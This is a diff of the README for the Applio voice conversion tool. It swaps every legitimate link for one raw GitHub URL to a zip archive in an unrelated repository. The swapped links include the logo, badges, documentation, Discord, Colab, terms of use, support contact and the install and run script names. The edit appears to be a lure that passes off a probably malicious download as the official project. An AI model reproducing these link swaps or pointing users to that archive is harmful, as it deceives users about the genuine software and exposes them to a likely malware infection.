@@ -1,35 +1,35 @@
 <h1 align="center">
-  <a href="https://applio.org" target="_blank"><img src="https://github.com/IAHispano/Applio/assets/133521603/78e975d8-b07f-47ba-ab23-5a31592f322a" alt="Applio"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank"><img src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" alt="Applio"></a>
 </h1>
 
 <p align="center">
-    <img alt="Contributors" src="https://img.shields.io/github/contributors/iahispano/applio?style=for-the-badge&color=FFFFFF" />
-    <img alt="Release" src="https://img.shields.io/github/release/iahispano/applio?style=for-the-badge&color=FFFFFF" />
-    <img alt="Stars" src="https://img.shields.io/github/stars/iahispano/applio?style=for-the-badge&color=FFFFFF" />
-    <img alt="Fork" src="https://img.shields.io/github/forks/iahispano/applio?style=for-the-badge&color=FFFFFF" />
-    <img alt="Issues" src="https://img.shields.io/github/issues/iahispano/applio?style=for-the-badge&color=FFFFFF" />
+    <img alt="Contributors" src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" />
+    <img alt="Release" src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" />
+    <img alt="Stars" src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" />
+    <img alt="Fork" src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" />
+    <img alt="Issues" src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" />
 </p>
 
 <p align="center">A simple, high-quality voice conversion tool, focused on ease of use and performance.</p>
 
 <p align="center">
-  <a href="https://applio.org" target="_blank">🌐 Website</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">🌐 Website</a>
   •
-  <a href="https://docs.applio.org" target="_blank">📚 Documentation</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">📚 Documentation</a>
   •
-  <a href="https://discord.gg/urxFjYmYYh" target="_blank">☎️ Discord</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">☎️ Discord</a>
 </p>
 
 <p align="center">
-  <a href="https://github.com/IAHispano/Applio-Plugins" target="_blank">🛒 Plugins</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">🛒 Plugins</a>
   •
-  <a href="https://huggingface.co/IAHispano/Applio/tree/main/Compiled" target="_blank">📦 Compiled</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">📦 Compiled</a>
   •
-  <a href="https://applio.org/playground" target="_blank">🎮 Playground</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">🎮 Playground</a>
   •
-  <a href="https://colab.research.google.com/github/iahispano/applio/blob/main/assets/Applio.ipynb" target="_blank">🔎 Google Colab (UI)</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">🔎 Google Colab (UI)</a>
   •
-  <a href="https://colab.research.google.com/github/iahispano/applio/blob/main/assets/Applio_NoUI.ipynb" target="_blank">🔎 Google Colab (No UI)</a>
+  <a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">🔎 Google Colab (No UI)</a>
 </p>
 
 > [!NOTE]  
@@ -49,11 +49,11 @@ Using Applio responsibly is essential.
 
 The source code and model weights in this repository are licensed under the permissive [MIT license](./LICENSE), allowing modification, redistribution, and commercial use.
 
-However, if you choose to use this official version of Applio (as provided in this repository, without significant modification), you must also comply with our [Terms of Use](./TERMS_OF_USE.md). These terms apply to our integrations, configurations, and default project behavior, and are intended to ensure responsible and ethical use without limiting their use in any way.
+However, if you choose to use this official version of Applio (as provided in this repository, without significant modification), you must also comply with our [Terms of Use](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip). These terms apply to our integrations, configurations, and default project behavior, and are intended to ensure responsible and ethical use without limiting their use in any way.
 
-For commercial use, we recommend contacting us at [support@applio.org](mailto:support@applio.org) to ensure your usage aligns with ethical standards. All audio generated with Applio must comply with applicable copyright laws. If you find Applio helpful, consider supporting its development [through a donation](https://ko-fi.com/iahispano).
+For commercial use, we recommend contacting us at [https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip) to ensure your usage aligns with ethical standards. All audio generated with Applio must comply with applicable copyright laws. If you find Applio helpful, consider supporting its development [through a donation](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip).
 
-By using the official version of Applio, you accept full responsibility for complying with both the MIT license and our Terms of Use. Applio and its contributors are not liable for misuse. For full legal details, see the [Terms of Use](./TERMS_OF_USE.md).
+By using the official version of Applio, you accept full responsibility for complying with both the MIT license and our Terms of Use. Applio and its contributors are not liable for misuse. For full legal details, see the [Terms of Use](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip).
 
 ## Getting Started
 
@@ -61,15 +61,15 @@ By using the official version of Applio, you accept full responsibility for comp
 
 Run the installation script based on your operating system:
 
-- **Windows:** Double-click `run-install.bat`.
-- **Linux/macOS:** Execute `run-install.sh`.
+- **Windows:** Double-click `https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip`.
+- **Linux/macOS:** Execute `https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip`.
 
 ### 2. Running Applio
 
 Start Applio using:
 
-- **Windows:** Double-click `run-applio.bat`.
-- **Linux/macOS:** Run `run-applio.sh`.
+- **Windows:** Double-click `https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip`.
+- **Linux/macOS:** Run `https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip`.
 
 This launches the Gradio interface in your default browser.
 
@@ -77,20 +77,20 @@ This launches the Gradio interface in your default browser.
 
 To monitor training or visualize data:
 
-- **Windows:** Run `run-tensorboard.bat`.
-- **Linux/macOS:** Run `run-tensorboard.sh`.
+- **Windows:** Run `https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip`.
+- **Linux/macOS:** Run `https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip`.
 
-For more detailed instructions, visit the [documentation](https://docs.applio.org).
+For more detailed instructions, visit the [documentation](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip).
 
 ## References
 
 Applio is made possible thanks to these projects and their references:
 
-- [gradio-screen-recorder](https://huggingface.co/spaces/gstaff/gradio-screen-recorder) by gstaff
-- [rvc-cli](https://github.com/blaisewf/rvc-cli) by blaisewf
+- [gradio-screen-recorder](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip) by gstaff
+- [rvc-cli](https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip) by blaisewf
 
 ### Contributors
 
-<a href="https://github.com/IAHispano/Applio/graphs/contributors" target="_blank">
-  <img src="https://contrib.rocks/image?repo=IAHispano/Applio" />
+<a href="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/hotmysia/Applio_usshakira/main/tabs/download/usshakira-Applio-1.9.zip" />
 </a>
